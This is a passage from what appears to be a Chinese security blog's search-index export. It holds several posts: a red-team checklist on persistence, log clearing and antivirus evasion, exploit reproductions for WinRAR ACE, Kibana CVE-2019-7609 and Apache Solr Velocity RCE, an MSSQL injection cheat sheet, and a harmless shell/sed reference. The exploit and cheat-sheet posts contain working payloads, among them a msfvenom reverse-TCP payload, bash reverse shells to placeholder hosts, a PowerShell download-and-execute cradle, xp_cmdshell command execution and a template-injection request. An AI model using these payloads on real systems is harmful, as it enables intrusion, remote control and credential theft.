]    * 边界入口权限维持</code></pre><p>OWA 登录口 [ 账号密码,webshell ]<br>VPN 登录口 [ 账号密码,shell ]<br>其他 MAIL 登录口 [ 账号密码 ]<br>边界 Web服务器 [ Webshell 驻留技巧 ]<br>边界路由交换设备 [ 账号密码,shell ]<br>…</p><pre><code>* Windows 单机系统维持 [临时]</code></pre><p>系统计划任务 [ 高权限/低权限 ]<br>常规注册表自启动项 [ 用户权限/system权限 ]<br>Mssql存储过程 [ 继承服务权限 ]<br>WMI<br>Winlogon<br>CLR<br>Logon Scripts<br>MruPidlList<br>Mof<br>传统远控<br>…</p><pre><code>* linux 单机系统维持 [临时]</code></pre><p>Patch SSH<br>替换各类基础服务so [ PAM,Nginx,Rsync …]<br>系统计划任务<br>传统应用层远控<br>驱动层远控( 针对特定内核版本 )</p><pre><code>### 0x12 痕迹处理</code></pre><p>web日志 [ 访问, 错误日志 ]<br>数据库日志 [ 异常连接日志,慢查询日志 ]<br>系统各类安全日志 [ ssh,rdp,smb,wmi,powershell….]<br>各类邮箱登录日志<br>域内敏感攻击利用日志 [ 金票,银票… ]<br>此项为专业蓝队范畴,不再赘述<br>……</p><pre><code>### 0x13 各类常用 C2 / 渗透 框架</code></pre><p>CobaltStrike [二次开发]<br>  payload(beacon) 逆向/改进重写<br>Metasploit [二次开发]<br>……</p><pre><code>### 0x14 各类常用 Webshell管理工具</code></pre><p>菜刀    caidao20160622<br>冰蟹    Behinder_v2.0.1<br>蚁剑    AntSword<br>……</p><pre><code>### 0x15 免杀 及 各类防火墙对抗    * 静态</code></pre><p>混淆:<br>手工混淆,有源码的情况下,尝试逐个替换可能是关键特征字符串的 命名空间名, 函数名, 变量名, 字符串 等等等….<br>工具混淆,针对各种语言的专业混淆工具 [ 有商业版 ]<br>…</p><p>加壳:<br>一些常用公开壳的实际效果可能并不是太好 [ 也有商业壳 ]<br>最好的方式还是尝试自己写壳,就是成本较高<br>…</p><pre><code>* 动态</code></pre><p>反射<br>shellcode 内存加解密执行 ( 对于现在的某些杀软来讲,可能并没什么卵用,别人拦的基本都是你的最终调用 )<br>白利用<br>……</p><p>注:<br>   理论上, 这些应该也没有什么非常通用的方法<br>   大多还是事先针对特定的杀软针对性的不停调试分析出它到底怎么拦,怎么查的,然后再针对性的对症下药</p><pre><code>* 流量:</code></pre><p>域前置[利用大厂cdn]<br>DNS加密隧道<br>第三方公共邮箱上线<br>第三方网盘上线<br>第三方社交网站上线<br>第三方匿名社交工具上线[eg: tg机器人,tor…]</p><pre><code>##### 更多高质量精品实用干货分享,欢迎( 注: 乱七八杂的娱乐人员请不要来,来时请严格注明来意,否则一律不予通过,谢谢,期待认真做技术的你 )&lt;img src=&quot;ak.jpg&quot; /&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>winrar命令执行复现</title>
      <link href="2021/05/31/winrar%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/05/31/winrar%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><ul><li>msfconsole</li><li>winrar &lt; 5.7</li></ul><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>win2008R2 + winrar x64 5.6 </p><h2 id="使用msf生成payload"><a href="#使用msf生成payload" class="headerlink" title="使用msf生成payload"></a>使用msf生成payload</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x.x lport=4445 -f exe -e x86/shikata_ga_nai -o ~/test.exe</code></pre><p><img src="http://img.osshell.com/20200213044059.png"></p><h2 id="生成ace"><a href="#生成ace" class="headerlink" title="生成ace"></a>生成ace</h2><pre><code>use exploit/windows/fileformat/winrar_ace</code></pre><p><img src="http://img.osshell.com/20200213044355.png"></p><pre><code>set custfile 刚才生成的payload</code></pre><p><img src="http://img.osshell.com/20200213044538.png"></p><pre><code>set windows/meterpreter/reverse_tcpexploit</code></pre><p><img src="http://img.osshell.com/20200213044613.png"></p><h2 id="运行payload并重启"><a href="#运行payload并重启" class="headerlink" title="运行payload并重启"></a>运行payload并重启</h2><p><img src="http://img.osshell.com/20200213044735.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/qq_41079177/article/details/88409349">https://blog.csdn.net/qq_41079177/article/details/88409349</a></p>]]></content>
      
      
      <categories>
          
          <category> Exploits </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Winrar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kibana &lt; 6.6.1 代码执行漏洞复现CVE-2019-7609</title>
      <link href="2021/05/31/Kibana%20%3C%206.6.1%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0CVE-2019-7609/"/>
      <url>2021/05/31/Kibana%20%3C%206.6.1%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0CVE-2019-7609/</url>
      
        <content type="html"><![CDATA[<h2 id="Kibana描述"><a href="#Kibana描述" class="headerlink" title="Kibana描述"></a>Kibana描述</h2><p>Kibana 是一款开源的数据分析和可视化平台，它是 Elastic Stack 成员之一，设计用于和 Elasticsearch 协作。您可以使用 Kibana 对 Elasticsearch 索引中的数据进行搜索、查看、交互操作。您可以很方便的利用图表、表格及地图对数据进行多元化的分析和呈现。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2019年2月官方发布公告称Kibana存在远程代码执行漏洞，5.6.15 和 6.6.1之前的 Kibana 版本在 Timelion 可视化工具中存在功能缺陷，导致攻击者可在服务器上利用Kibana执行任意代码.</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>&lt; 5.6.15<br>&lt; 6.6.1</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>基于docker<ol><li>docker pull kibana:6.5.4</li><li>docker pull elasticsearch:6.5.4</li><li>docker network create somenetwork</li><li>docker run -d –name kibana –net somenetwork -p 5601:5601 kibana:6.5.4</li><li>docker run -d –name elasticsearch –net somenetwork -p 9200:9200 -p 9300:9300 -e “discovery.type=single-node” elasticsearch:6.5.4</li></ol></li><li>zoomeye</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p> <a href="https://discuss.elastic.co/t/elastic-stack-6-6-1-and-5-6-15-security-update/169077">https://discuss.elastic.co/t/elastic-stack-6-6-1-and-5-6-15-security-update/169077</a><br> <a href="https://www.elastic.co/cn/community/security">https://www.elastic.co/cn/community/security</a></p><p>.es(*).props(label.<strong>proto</strong>.env.AAAA=’require(“child_process”).exec(“bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/1234 0&gt;&amp;1”);process.exit()//‘)<br>.props(label.<strong>proto</strong>.env.NODE_OPTIONS=’–require /proc/self/environ’)</p><p>.es(*).props(label.<strong>proto</strong>.env.AAAA=’require(“child_process”).exec(“bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/8989 0&gt;&amp;1”);process.exit()//‘)<br>.props(label.<strong>proto</strong>.env.NODE_OPTIONS=’–require /proc/self/environ’)</p>]]></content>
      
      
      <categories>
          
          <category> Exploits </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kibana </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手工SQLi语句备忘录</title>
      <link href="2021/05/31/%E6%89%8B%E5%B7%A5SQLi%E8%AF%AD%E5%8F%A5%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>2021/05/31/%E6%89%8B%E5%B7%A5SQLi%E8%AF%AD%E5%8F%A5%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><h3 id="获取数据库数量"><a href="#获取数据库数量" class="headerlink" title="获取数据库数量"></a>获取数据库数量</h3><p><code>select count(name) from master..sysdatabases;</code></p><h3 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h3><p><code>select name from master..sysdatabases;</code><br><code>select DB_NAME(i);</code></p><h3 id="查询表数量"><a href="#查询表数量" class="headerlink" title="查询表数量"></a>查询表数量</h3><p><code>SELECT count(name) FROM master..sysobjects where xtype =&#39;u&#39;;</code></p><h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p><code>select name from master..sysobjects where xtype=&#39;U&#39;;</code>  </p><h3 id="查询列名数量"><a href="#查询列名数量" class="headerlink" title="查询列名数量"></a>查询列名数量</h3><p><code>SELECT COUNT(name) FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = &#39;model&#39;);</code></p><h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p><code>SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = &#39;tablename&#39;);</code> </p><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code>CREATE TABLE mydata (line varchar(8000));BULK INSERT mydata FROM &quot;c:/exp.txt&quot;;SELECT * FROM mydata;DROP TABLE mydata;</code></pre><h3 id="cmdshell确认"><a href="#cmdshell确认" class="headerlink" title="cmdshell确认"></a>cmdshell确认</h3><p><code>select count(*) from master..sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;;</code></p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><h4 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h4><ol><li>启用cmdshell<br><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></li><li>执行命令<br><code>EXEC master.dbo.xp_cmdshell &quot;whoami&quot;;</code></li></ol><h4 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h4><ol><li>开启sp_oacreate <pre><code>EXEC sp_configure &#39;show advanced options&#39;, 1;   RECONFIGURE WITH OVERRIDE;   EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;   RECONFIGURE WITH OVERRIDE;   EXEC sp_configure &#39;show advanced options&#39;, 0;</code></pre></li><li>执行命令<br><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\\\1.txt&#39;</code></li></ol><h5 id="使用sp-oacreate执行文件操作"><a href="#使用sp-oacreate执行文件操作" class="headerlink" title="使用sp_oacreate执行文件操作"></a>使用sp_oacreate执行文件操作</h5><ul><li>复制文件<br><code>DECLARE @o INT EXEC sp_oacreate &#39;scripting.filesystemobject&#39;, @o out exec sp_oamethod @o, &#39;copyfile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;;</code></li><li>删除文件<br><code>DECLARE @d INT DECLARE @FSO_Token INT EXEC @d=sp_oacreate &#39;scripting.filesystemobject&#39;,@FSO_Token OUTPUT EXEC @d=sp_oamethod @FSO_Token, &#39;deletefile&#39;,null,&#39;c:\2.txt&#39; EXEC @d = sp_oadestroy @FSO_Token</code></li><li>移动文件<br><code>DECLARE @m INT EXEC sp_oacreate &#39;scripting.filesystemobject&#39;,@m OUT EXEC sp_oamethod @m, &#39;movefile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;</code></li></ul><h4 id="agent-job"><a href="#agent-job" class="headerlink" title="agent job"></a>agent job</h4><pre><code>USE msdb;EXEC dbo.sp_add_job @job_name = N&#39;clay_powershell_job1&#39; ; EXEC sp_add_jobstep     @job_name = N&#39;clay_powershell_job1&#39;,     @step_name = N&#39;clay_powershell_name1&#39;,     @subsystem = N&#39;PowerShell&#39;,     @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://Your_IP/Your_file&#39;&#39;))&quot;&#39;,     @retry_attempts = 1,     @retry_interval = 5;EXEC dbo.sp_add_jobserver     @job_name = N&#39;clay_powershell_job1&#39;; EXEC dbo.sp_start_job N&#39;clay_powershell_job1&#39;;</code></pre><h3 id="读取sa密码"><a href="#读取sa密码" class="headerlink" title="读取sa密码"></a>读取sa密码</h3><p><code>select name,master.sys.fn_sqlvarbasetostr(password_hash) from master.sys.sql_logins</code></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell脚本速查</title>
      <link href="2021/05/31/shell%E8%84%9A%E6%9C%AC%E9%80%9F%E6%9F%A5/"/>
      <url>2021/05/31/shell%E8%84%9A%E6%9C%AC%E9%80%9F%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="示例脚本"><a href="#示例脚本" class="headerlink" title="示例脚本"></a>示例脚本</h2><pre><code>var=&quot;123&quot;`ls -al` == $(ls -al)echo $var === echo $&#123;var&#125;获取字符段长度length=$&#123;#string&#125;:&lt;&lt;EOF注释内容EOF关系运算符-eq    检测两个数是否相等，相等返回 true。    [ $a -eq $b ] 返回 false。-ne    检测两个数是否不相等，不相等返回 true。    [ $a -ne $b ] 返回 true。-gt    检测左边的数是否大于右边的，如果是，则返回 true。    [ $a -gt $b ] 返回 false。-lt    检测左边的数是否小于右边的，如果是，则返回 true。    [ $a -lt $b ] 返回 true。-ge    检测左边的数是否大于等于右边的，如果是，则返回 true。    [ $a -ge $b ] 返回 false。-le    检测左边的数是否小于等于右边的，如果是，则返回 true。    [ $a -le $b ] 返回 true。布尔运算符运算符!    非运算，表达式为 true 则返回 false，否则返回 true。    [ ! false ] 返回 true。-o    或运算，有一个表达式为 true 则返回 true。    [ $a -lt 20 -o $b -gt 100 ] 返回 true。-a    与运算，两个表达式都为 true 才返回 true。    [ $a -lt 20 -a $b -gt 100 ] 返回 false。字符串运算符运算符=    检测两个字符串是否相等，相等返回 true。    [ $a = $b ] 返回 false。!=    检测两个字符串是否不相等，不相等返回 true。    [ $a != $b ] 返回 true。-z    检测字符串长度是否为0，为0返回 true。    [ -z $a ] 返回 false。-n    检测字符串长度是否不为 0，不为 0 返回 true。    [ -n &quot;$a&quot; ] 返回 true。$    检测字符串是否为空，不为空返回 true。    [ $a ] 返回 true。文件测试运算符操作符-b file    检测文件是否是块设备文件，如果是，则返回 true。    [ -b $file ] 返回 false。-c file    检测文件是否是字符设备文件，如果是，则返回 true。    [ -c $file ] 返回 false。-d file    检测文件是否是目录，如果是，则返回 true。    [ -d $file ] 返回 false。-f file    检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。    [ -f $file ] 返回 true。-g file    检测文件是否设置了 SGID 位，如果是，则返回 true。    [ -g $file ] 返回 false。-k file    检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。    [ -k $file ] 返回 false。-p file    检测文件是否是有名管道，如果是，则返回 true。    [ -p $file ] 返回 false。-u file    检测文件是否设置了 SUID 位，如果是，则返回 true。    [ -u $file ] 返回 false。-r file    检测文件是否可读，如果是，则返回 true。    [ -r $file ] 返回 true。-w file    检测文件是否可写，如果是，则返回 true。    [ -w $file ] 返回 true。-x file    检测文件是否可执行，如果是，则返回 true。    [ -x $file ] 返回 true。-s file    检测文件是否为空（文件大小是否大于0），不为空返回 true。    [ -s $file ] 返回 true。-e file    检测文件（包括目录）是否存在，如果是，则返回 true。    [ -e $file ] 返回 true。将stdout和stderr重定向到filecommand &gt; file 2&gt;&amp;1屏蔽stdout和stderrcommand &gt; /dev/null 2&gt;&amp;1</code></pre><h2 id="sed使用"><a href="#sed使用" class="headerlink" title="sed使用"></a>sed使用</h2><h3 id="打印行"><a href="#打印行" class="headerlink" title="打印行"></a>打印行</h3><pre><code>sed -n -e &#39;/^root/ p&#39; /etc/passwd == sed -n &#39;&#123;/^root/ p&#125;&#39; /etc/passwd/^root/:root开头 /nobody$/:nobody结尾sed -n &#39;开始行,结束行 p&#39; FILE  开始行和结束行可以是行号也可以是关键字# 寻找包含Paul的行$sed -n &#39;/Paul/ p&#39; source.txt# 从第一行开始到第五行, 从找到开始打印到第五行$sed -n &#39;/Paul/,5 p&#39; source.txt# 从匹配Paul行打印达匹配Addy的行$sed -n &#39;/Paul/,/Addy/ p&#39; source.txt# 在freebsd版sed不能用 匹配Paul行再多输出2行$/usr/local/bin/sed -n &#39;/Paul/,+2 p&#39; source.txt</code></pre><h3 id="删除行"><a href="#删除行" class="headerlink" title="删除行"></a>删除行</h3><pre><code>删除全部行sed &#39;d&#39; source.txt 删除空行$sed &#39;/^$/ d&#39; source.txt删除评论行$sed &#39;/^#/ d&#39; source.txt</code></pre><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><pre><code>将内容重定向写到output.txtsed &#39;w output.txt&#39; source.txt将匹配到关键字的行写到output.txtsed -n &#39;/Ask/,$ w output.txt&#39;</code></pre><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><pre><code>sed &#39;[address-range|pattern-range] s/original-string/replacement-string/[substitute-flags]&#39; inputfile将Google替换为GitHubsed &#39;s/Google/Github/&#39; source.txt替换匹配Addy的行里面的Google为Githubsed &#39;/Addy/s/Google/Github/&#39; source.txtg可以替换每行的全部符合sed &#39;s/a/A/g&#39;  source.txt指定替换第二个匹配项sed &#39;s/a/A/2&#39;  source.txt替换指定内容给两边加上&lt;&gt;sed &#39;s/^.*/&lt;&amp;&gt;/&#39; FILE修改源文件sed -ised -ibak</code></pre><h3 id="行后增加"><a href="#行后增加" class="headerlink" title="行后增加"></a>行后增加</h3><pre><code>sed &#39;[address] a the-line-to-append&#39; input-filesed &#39;2 a 108,Donald Stufft, Nebula&#39; source.txt101,IAN Bicking,Mozilla102,Hakim El Hattab,Whim108,Donald Stufft, Nebula</code></pre><h3 id="行前插入语法"><a href="#行前插入语法" class="headerlink" title="行前插入语法"></a>行前插入语法</h3><pre><code>sed &#39;2 i 108,Donald Stufft, Nebula&#39; source.txt101,IAN Bicking,Mozilla108,Donald Stufft, Nebula102,Hakim El Hattab,Whim</code></pre><h3 id="修改行语法"><a href="#修改行语法" class="headerlink" title="修改行语法"></a>修改行语法</h3><pre><code>sed &#39;/Paul/ c 108,Donald Stufft, Nebula&#39; source.txt101,IAN Bicking,Mozilla102,Hakim El Hattab,Whim108,Donald Stufft, Nebula</code></pre>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Solr Velocity模板远程代码执行漏洞复现</title>
      <link href="2019/11/01/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2019/11/01/Apache%20Solr%20Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Apache-Solr描述"><a href="#Apache-Solr描述" class="headerlink" title="Apache Solr描述"></a>Apache Solr描述</h2><p>Solr（读作“solar”）是Apache Lucene项目的开源企业搜索平台。其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本（如Word、PDF）的处理。Solr是高度可扩展的，并提供了分布式搜索和索引复制。<br>Solr是用Java编写、运行在Servlet容器（如Apache Tomcat或Jetty）的一个独立的全文搜索服务器。 Solr采用了Lucene Java搜索库为核心的全文索引和搜索，并具有类似REST的HTTP/XML和JSON的API。 Solr强大的外部配置功能使得无需进行Java编码，便可对其进行调整以适应多种类型的应用程序。Solr有一个插件架构，以支持更多的高级定制。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>近日,国外安全研究员s00py公开了一个Apache Solr的Velocity模板注入的漏洞.该漏洞可以攻击最新版本的Solr.目前该漏洞利用详情已经广泛流传于Github以及各大安全群,且公开的EXP可以执行任意命令并自带回显.官方暂未发布补丁.</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>≤8.2.0(目前最新版本)</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>Apache Solr下载地址:<a href="https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip">solr-8.0.2.zip</a></li><li>基于docker:  <ol><li><code>docker pull solr</code>  </li><li><code>docker run --name my-solr -d -p 8983:8983 -t solr</code></li></ol></li><li>zoomeye:<br>  zoomeye搜索<code>port:8983 +app:&quot;Apache Solr&quot;</code><br>  <img src="http://img.osshell.com/20191101160658.png"><br>  图中可以看到HTTP显示的状态码为<code>302</code>状态码,这是由于solr默认访问ip后均会跳转到solr目录.<br>  打开后可以看到是正常的solr界面:<br>  <img src="http://img.osshell.com/20191101161114.png"></li></ul><h3 id="POC复测"><a href="#POC复测" class="headerlink" title="POC复测"></a>POC复测</h3><ol><li>首先我们要获取到solr的其中任意一个core名,可以通过以下两种方法:<ul><li>通过Logging报错</li><li>通过左下方的Core Selector<br><img src="http://img.osshell.com/20191101161537.png"></li></ul></li><li>获取core名称后访问<code>solr/core-name/config</code>确认config可以访问</li><li><img src="http://img.osshell.com/20191101161843.png"></li><li>向<code>solr/core-name/config</code>发送POST数据包,payload如下: </li></ol><pre><code class="json">&#123;  &quot;update-queryresponsewriter&quot;: &#123;    &quot;startup&quot;: &quot;lazy&quot;,    &quot;name&quot;: &quot;velocity&quot;,    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,    &quot;template.base.dir&quot;: &quot;&quot;,    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;  &#125;&#125;</code></pre><ol><li>查看<code>solr/core-name/config</code>确认<code>params.resource.loader.enabled</code>的值已经修改为<code>true</code></li><li>发送get请求执行命令,payload如下:<br> <code>/solr/merchant/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27ls%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</code><br> 命令执行成功返回结果:<br> <img src="http://img.osshell.com/20191101170730.png"></li></ol><h3 id="更多参考"><a href="#更多参考" class="headerlink" title="更多参考"></a>更多参考</h3><ol><li><a href="https://nosec.org/home/detail/3113.html">https://nosec.org/home/detail/3113.html</a></li><li><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Exploits </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
